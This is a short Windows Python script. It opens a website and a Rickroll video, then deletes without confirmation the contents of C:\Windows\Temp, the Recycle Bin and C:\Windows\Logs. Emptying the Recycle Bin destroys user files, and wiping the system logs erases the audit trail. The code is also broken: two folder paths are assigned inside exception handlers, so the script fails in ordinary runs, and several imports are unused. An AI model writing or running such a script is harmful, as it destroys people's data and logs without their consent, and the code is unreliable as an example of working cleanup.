import shutil, os, webbrowser, subprocess, winreg, tkinter as tk, time



def Codescribe():
    webbrowser.open("http://codescribe.tilda.ws")

def Rick():
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

Codescribe()

time.sleep(2)

Rick()
folder = 'c:\windows\Temp'

for filename in os.listdir(folder):
    file_path = os.path.join(folder, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (file_path, e))


        DelBin = 'C:\$Recycle.Bin'
for filename in os.listdir(DelBin):
    file_path = os.path.join(DelBin, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (file_path, e))

        DelLogs = 'C:\\Windows\\Logs\\'
for filename in os.listdir(DelLogs):
    file_path = os.path.join(DelLogs, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (file_path, e))


    
